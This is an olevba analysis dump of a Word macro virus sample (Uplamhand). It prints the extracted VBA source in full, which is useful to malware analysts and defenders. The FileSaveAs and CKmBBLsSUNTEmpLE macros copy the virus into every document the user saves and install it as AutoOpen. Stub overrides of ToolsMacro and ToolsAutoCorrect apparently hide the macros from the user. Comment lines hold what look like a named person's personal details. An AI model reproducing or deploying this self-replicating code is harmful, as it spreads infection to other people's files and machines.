olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Uplamhand-dd0952ecdc446819c64a9ec38ef825ebfd6ab4bf
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Uplamhand-dd0952ecdc446819c64a9ec38ef825ebfd6ab4bf - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO PrajnaParamitaDiamondSutra.bas 
in file: Virus.MSWord.Uplamhand-dd0952ecdc446819c64a9ec38ef825ebfd6ab4bf - OLE stream: 'Macros/VBA/PrajnaParamitaDiamondSutra'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
    Rem CHANKINMANISSHOSHI6F200PBORNINJAPANIN1983W/LB/LS
    Rem CHANM:LIUBOMEIF:CHIUKWONGFUES:CHOISIUHUI
    Rem CHAN13/ES:17/M:30/F:35/RICH
    Rem 1996DEC29INSTFSCFSHF8/F2WPWD/901109
    Rem CHANW/GROWTH->POPULAR
End Sub
-------------------------------------------------------------------------------
VBA MACRO ToolsAutoCorrect.bas 
in file: Virus.MSWord.Uplamhand-dd0952ecdc446819c64a9ec38ef825ebfd6ab4bf - OLE stream: 'Macros/VBA/ToolsAutoCorrect'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Adds or deletes AutoCorrect entries"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.ToolsAutoCorrect.MAIN"
'Dim dlg As ToolsAutoCorrect
'GetCurValues dlg
'Dialog dlg
'ToolsAutoCorrect dlg
'shoshi

End Sub
-------------------------------------------------------------------------------
VBA MACRO CKmBBLsSUNTEmpLE.bas 
in file: Virus.MSWord.Uplamhand-dd0952ecdc446819c64a9ec38ef825ebfd6ab4bf - OLE stream: 'Macros/VBA/CKmBBLsSUNTEmpLE'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim sMe$
Dim sTMacro$
'this becomes the FileSaveAs for the global template
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
On Error GoTo -1: On Error GoTo Bail
WordBasic.CurValues.FileSaveAs dlg
WordBasic.Dialog.FileSaveAs dlg
'If dlg.Format = 0 Then dlg.Format = 1
sMe$ = WordBasic.[FileName$]()
sTMacro$ = sMe$ + ":AutoOpen"
WordBasic.MacroCopy "Global:CHANKINMANISSHOSHI6F200P", sTMacro$
sTMacro$ = sMe$ + ":CHANKINMANISSHOSHI6F200P"
WordBasic.MacroCopy "Global:CHANKINMANISSHOSHI6F200P", sTMacro$
sTMacro$ = sMe$ + ":CKMBBLSSUNTEMPLE"
WordBasic.MacroCopy "Global:CKMBBLSSUNTEMPLE", sTMacro$
sTMacro$ = sMe$ + ":PrajnaParamitaDiamondSutra"
WordBasic.MacroCopy "Global:PrajnaParamitaDiamondSutra", sTMacro$

sTMacro$ = sMe$ + ":ToolsMacro"
WordBasic.MacroCopy "Global:ToolsMacro", sTMacro$
sTMacro$ = sMe$ + ":ToolsAutoCorrect"
WordBasic.MacroCopy "Global:ToolsAutoCorrect", sTMacro$


WordBasic.FileSaveAs dlg
GoTo Done

Bail:
If Err.Number <> 102 Then
    WordBasic.FileSaveAs dlg
End If
Done:
End Sub
-------------------------------------------------------------------------------
VBA MACRO ToolsMacro.bas 
in file: Virus.MSWord.Uplamhand-dd0952ecdc446819c64a9ec38ef825ebfd6ab4bf - OLE stream: 'Macros/VBA/ToolsMacro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Runs, creates, deletes, or revises a macro"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.ToolsMacro.MAIN"
'Dim dlg As ToolsMacro
'GetCurValues dlg
'Dialog dlg
'ToolsMacro dlg
'shoshi

End Sub
-------------------------------------------------------------------------------
VBA MACRO FileSaveAs.bas 
in file: Virus.MSWord.Uplamhand-dd0952ecdc446819c64a9ec38ef825ebfd6ab4bf - OLE stream: 'Macros/VBA/FileSaveAs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim sMe$
Dim sTMacro$
'this becomes the FileSaveAs for the global template
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
On Error GoTo -1: On Error GoTo Bail
WordBasic.CurValues.FileSaveAs dlg
WordBasic.Dialog.FileSaveAs dlg
'If dlg.Format = 0 Then dlg.Format = 1
sMe$ = WordBasic.[FileName$]()
sTMacro$ = sMe$ + ":AutoOpen"
WordBasic.MacroCopy "Global:CHANKINMANISSHOSHI6F200P", sTMacro$
sTMacro$ = sMe$ + ":CHANKINMANISSHOSHI6F200P"
WordBasic.MacroCopy "Global:CHANKINMANISSHOSHI6F200P", sTMacro$
sTMacro$ = sMe$ + ":CKMBBLSSUNTEMPLE"
WordBasic.MacroCopy "Global:CKMBBLSSUNTEMPLE", sTMacro$
sTMacro$ = sMe$ + ":PrajnaParamitaDiamondSutra"
WordBasic.MacroCopy "Global:PrajnaParamitaDiamondSutra", sTMacro$

sTMacro$ = sMe$ + ":ToolsMacro"
WordBasic.MacroCopy "Global:ToolsMacro", sTMacro$
sTMacro$ = sMe$ + ":ToolsAutoCorrect"
WordBasic.MacroCopy "Global:ToolsAutoCorrect", sTMacro$



WordBasic.FileSaveAs dlg
GoTo Done

Bail:
If Err.Number <> 102 Then
    WordBasic.FileSaveAs dlg
End If
Done:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

